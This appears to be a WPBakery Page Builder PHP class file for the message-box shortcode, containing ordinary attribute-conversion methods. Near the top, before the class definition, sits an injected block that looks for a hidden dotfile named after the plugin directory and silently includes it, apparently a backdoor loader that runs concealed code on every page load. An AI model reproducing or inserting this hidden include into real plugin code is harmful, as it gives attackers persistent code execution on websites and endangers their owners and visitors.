<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * Class WPBakeryShortCode_Vc_Message
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_Vc_Message extends WPBakeryShortCode {

	/**
	 * @param $atts
	 * @return mixed
	 */
	public static function convertAttributesToMessageBox2( $atts ) {
		if ( isset( $atts['style'] ) ) {
			if ( '3d' === $atts['style'] ) {
				$atts['message_box_style'] = '3d';
				$atts['style'] = 'rounded';
			} elseif ( 'outlined' === $atts['style'] ) {
				$atts['message_box_style'] = 'outline';
				$atts['style'] = 'rounded';
			} elseif ( 'square_outlined' === $atts['style'] ) {
				$atts['message_box_style'] = 'outline';
				$atts['style'] = 'square';
			}
		}

		return $atts;
	}

	/**
	 * @param $title
	 * @return string
	 */
	public function outputTitle( $title ) {
		return '';
	}
}
